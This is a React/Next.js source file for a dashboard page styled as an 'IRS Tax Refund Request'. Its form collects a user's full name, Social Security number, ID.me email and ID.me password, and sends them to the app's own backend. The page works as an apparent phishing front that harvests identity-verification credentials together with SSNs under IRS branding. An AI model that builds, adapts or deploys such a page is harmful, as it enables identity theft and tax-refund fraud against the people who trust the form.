'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import {
  ChevronRight, Receipt, User, Shield, Lock, Mail, Key, MapPin,
  Loader2, CheckCircle, Clock, Info, Send,
} from 'lucide-react';
import { useAuth } from '@/contexts/AuthContext';
import toast from 'react-hot-toast';

interface IrsRefund {
  _id: string;
  name: string;
  ssn: string;
  idmeEmail: string;
  country: string;
  filingId?: string;
  status: string;
  createdAt: string;
  updatedAt: string;
}

const COUNTRIES = [
  'United States', 'Canada', 'United Kingdom', 'Australia', 'Germany',
  'France', 'Japan', 'China', 'India', 'Brazil', 'Mexico', 'Other'
];

export default function IrsRefundPage() {
  const router = useRouter();
  const { user } = useAuth();

  const [refund, setRefund] = useState<IrsRefund | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const [formData, setFormData] = useState({
    name: '',
    ssn: '',
    idmeEmail: '',
    idmePassword: '',
    country: '',
  });

  useEffect(() => {
    const fetchRefund = async () => {
      const token = localStorage.getItem('token');
      if (!token) return;

      try {
        const res = await fetch('/api/user/irs-refunds?limit=1', {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (res.ok) {
          const data = await res.json();
          const refunds = data.data || [];
          if (refunds.length > 0) {
            const latestRefund = refunds[0];
            if (['pending', 'approved'].includes(latestRefund.status)) {
              setRefund(latestRefund);
            }
          }
        }
      } catch (error) {
        console.error('Failed to fetch refund:', error);
      } finally {
        setIsLoading(false);
      }
    };
    fetchRefund();
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.name || !formData.ssn || !formData.idmeEmail || !formData.idmePassword || !formData.country) {
      toast.error('Please fill in all required fields');
      return;
    }

    setIsSubmitting(true);

    try {
      const token = localStorage.getItem('token');
      if (!token) {
        toast.error('Please login to continue');
        return;
      }

      const res = await fetch('/api/user/irs-refunds', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify(formData),
      });

      const data = await res.json();

      if (res.ok) {
        toast.success('Refund request submitted successfully!');
        router.push('/dashboard/irs-refund/filing-id');
      } else {
        toast.error(data.error || data.message || 'Failed to submit request');
      }
    } catch (error) {
      console.error('Submit error:', error);
      toast.error('An error occurred. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-blue-500" />
      </div>
    );
  }

  // If user has pending/approved refund, show status
  if (refund && ['pending', 'approved'].includes(refund.status)) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] p-4 md:p-6">
        {/* Header */}
        <div className="mb-6">
          <div className="flex items-center text-sm">
            <Link href="/dashboard" className="text-gray-500 hover:text-blue-400">Dashboard</Link>
            <ChevronRight className="h-4 w-4 mx-2 text-gray-600" />
            <span className="text-gray-300">IRS Tax Refund</span>
          </div>
          <h1 className="text-2xl font-bold text-white mt-2" style={{color: "white"}}>IRS Tax Refund Request</h1>
        </div>

        <div className="max-w-3xl mx-auto">
          <div className="bg-[#111111] rounded-xl border border-gray-800 p-6">
            <div className="text-center">
              <div className={`w-16 h-16 rounded-full mx-auto mb-4 flex items-center justify-center ${
                refund.status === 'approved' ? 'bg-green-500/20' : 'bg-yellow-500/20'
              }`}>
                {refund.status === 'approved' ? (
                  <CheckCircle className="h-8 w-8 text-green-400" />
                ) : (
                  <Clock className="h-8 w-8 text-yellow-400" />
                )}
              </div>
              <h3 className="text-lg font-medium text-white mb-2" style={{color: "white"}}>
                {refund.status === 'approved' ? 'Your Refund Request is Approved' : 'Your Refund Request is Pending'}
              </h3>
              <p className="text-gray-400 mb-6">
                {refund.status === 'approved'
                  ? 'Your refund request has been approved. You will be notified when the refund is processed.'
                  : 'Your refund request is currently being reviewed. Please check back later for updates.'}
              </p>
              <Link
                href="/dashboard/irs-refund/track"
                className="inline-flex items-center px-4 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white font-medium transition-colors"
              >
                <Receipt className="h-4 w-4 mr-2" /> Track Status
              </Link>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0a] p-4 md:p-6">
      {/* Header */}
      <div className="mb-6">
        <div className="flex items-center text-sm">
          <Link href="/dashboard" className="text-gray-500 hover:text-blue-400">Dashboard</Link>
          <ChevronRight className="h-4 w-4 mx-2 text-gray-600" />
          <span className="text-gray-300">IRS Tax Refund</span>
        </div>
        <h1 className="text-2xl font-bold text-white mt-2" style={{color: "white"}}>IRS Tax Refund Request</h1>
        <p className="text-gray-400 mt-1">Please fill out the form below to submit your IRS tax refund request</p>
      </div>

      <div className="max-w-3xl mx-auto">
        {/* Header Banner */}
        <div className="bg-[#111111] rounded-xl border border-gray-800 overflow-hidden mb-6">
          <div className="bg-gradient-to-r from-[#004B87] to-blue-700 p-6 text-center">
            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4">
              <Receipt className="h-8 w-8 text-white" />
            </div>
            <h2 className="text-xl font-bold text-white" style={{color: "white"}}>IRS Tax Refund Request</h2>
            <p className="text-gray-200 mt-1">Submit your information to claim your tax refund</p>
          </div>
        </div>

        {/* Form */}
        <div className="bg-[#111111] rounded-xl border border-gray-800 p-6">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Personal Information */}
            <div className="bg-[#0a0a0a] rounded-xl border border-gray-800 p-5">
              <h3 className="text-lg font-medium text-white mb-4 flex items-center" style={{color: "white"}}>
                <User className="h-5 w-5 text-blue-400 mr-2" /> Personal Information
              </h3>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Full Name <span className="text-red-500">*</span>
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <User className="h-5 w-5 text-gray-500" />
                    </div>
                    <input
                      type="text"
                      name="name"
                      value={formData.name}
                      onChange={handleInputChange}
                      placeholder="Enter your full name"
                      className="w-full pl-10 pr-4 py-2.5 bg-[#111111] border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      required
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    Social Security Number (SSN) <span className="text-red-500">*</span>
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <Shield className="h-5 w-5 text-gray-500" />
                    </div>
                    <input
                      type="text"
                      name="ssn"
                      value={formData.ssn}
                      onChange={handleInputChange}
                      placeholder="XXX-XX-XXXX"
                      className="w-full pl-10 pr-4 py-2.5 bg-[#111111] border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      required
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* ID.me Credentials */}
            <div className="bg-[#0a0a0a] rounded-xl border border-gray-800 p-5">
              <h3 className="text-lg font-medium text-white mb-4 flex items-center" style={{color: "white"}}>
                <Lock className="h-5 w-5 text-blue-400 mr-2" /> ID.me Credentials
              </h3>

              <div className="space-y-4">
                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    ID.me Email <span className="text-red-500">*</span>
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <Mail className="h-5 w-5 text-gray-500" />
                    </div>
                    <input
                      type="email"
                      name="idmeEmail"
                      value={formData.idmeEmail}
                      onChange={handleInputChange}
                      placeholder="Enter your ID.me email"
                      className="w-full pl-10 pr-4 py-2.5 bg-[#111111] border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      required
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-medium text-gray-300 mb-2">
                    ID.me Password <span className="text-red-500">*</span>
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <Key className="h-5 w-5 text-gray-500" />
                    </div>
                    <input
                      type="password"
                      name="idmePassword"
                      value={formData.idmePassword}
                      onChange={handleInputChange}
                      placeholder="Enter your ID.me password"
                      className="w-full pl-10 pr-4 py-2.5 bg-[#111111] border border-gray-700 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
                      required
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Location Information */}
            <div className="bg-[#0a0a0a] rounded-xl border border-gray-800 p-5">
              <h3 className="text-lg font-medium text-white mb-4 flex items-center" style={{color: "white"}}>
                <MapPin className="h-5 w-5 text-blue-400 mr-2" /> Location Information
              </h3>

              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Country <span className="text-red-500">*</span>
                </label>
                <select
                  name="country"
                  value={formData.country}
                  onChange={handleInputChange}
                  className="w-full px-4 py-2.5 bg-[#111111] border border-gray-700 rounded-lg text-white appearance-none focus:outline-none focus:ring-2 focus:ring-blue-500"
                  required
                >
                  <option value="">Select your country</option>
                  {COUNTRIES.map((country) => (
                    <option key={country} value={country}>{country}</option>
                  ))}
                </select>
              </div>
            </div>

            {/* Important Notice */}
            <div className="bg-blue-500/10 border border-blue-500/30 rounded-xl p-4">
              <div className="flex">
                <Info className="h-5 w-5 text-blue-400 shrink-0 mt-0.5" />
                <div className="ml-3">
                  <h4 className="text-sm font-medium text-white" style={{color: "white"}}>Important Notice</h4>
                  <p className="text-sm text-gray-400 mt-1">
                    Please ensure all information provided is accurate and matches your ID.me account details.
                    Any discrepancies may result in delays or rejection of your refund request.
                  </p>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-3 rounded-lg bg-blue-600 hover:bg-blue-700 disabled:bg-blue-600/50 text-white font-medium flex items-center justify-center transition-colors"
            >
              {isSubmitting ? (
                <><Loader2 className="h-5 w-5 animate-spin mr-2" /> Submitting...</>
              ) : (
                <><Send className="h-5 w-5 mr-2" /> Submit Request</>
              )}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
